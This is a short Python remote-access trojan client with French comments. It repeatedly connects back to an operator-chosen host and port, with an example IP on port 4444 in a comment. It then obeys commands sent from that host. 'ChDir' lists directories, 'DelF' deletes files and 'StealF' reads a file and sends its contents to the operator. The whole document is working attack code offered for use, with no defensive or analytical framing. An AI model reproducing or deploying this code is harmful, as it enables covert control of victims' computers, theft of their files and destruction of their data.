import socket
import os
import time

def connect():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            client.connect(("", 8888)) # Ici tu met ton domaine/ip genre client.connect(("GayFurryPorn.net", 52789)) ou client.connect(("201.23.57.88", 4444))
            print("[+] Connecté au serveur.")
            return client
        except:
            print("[-] Connexion échouée, nouvelle tentative dans 1s...")
            time.sleep(1)

while True:
    Client = connect()

    try:
        while True:
            command = Client.recv(4096).decode()
            print(command)

            if command.startswith("<ChDir>"):
                target = command.replace("<ChDir>", "").strip()

                if not os.path.exists(target):
                    Client.send(b"<NotFound>")
                else:
                    try:
                        entries = os.listdir(target)
                        content = []

                        for entry in entries:
                            full_path = os.path.join(target, entry)
                            if os.path.isfile(full_path):
                                content.append("<file>" + entry)
                            else:
                                content.append("<folder>" + entry)

                        if content:
                            Client.send('\n'.join(content).encode())
                        else:
                            Client.send(b"<Empty>")

                    except Exception:
                        Client.send(b"<NotFound>")

            elif command.startswith("<DelF>"):
                try:
                    os.remove(command.replace("<DelF>", ""))
                    Client.send(b"<Ok>")
                except Exception as e:
                    Client.send(f"<Error>{e}".encode())

            elif command.startswith("<StealF>"):
                try:
                    with open(command.replace("<StealF>", ""), "rb") as StealF:
                        Client.send(StealF.read() + b"<EndF>")
                except Exception as e:
                    Client.send(f"<Error>{e}".encode())

    except Exception as e:
        print(f"[!] Erreur ou déconnexion : {e}")
        Client.close()
        time.sleep(1)
        print("[*] Tentative de reconnexion...")

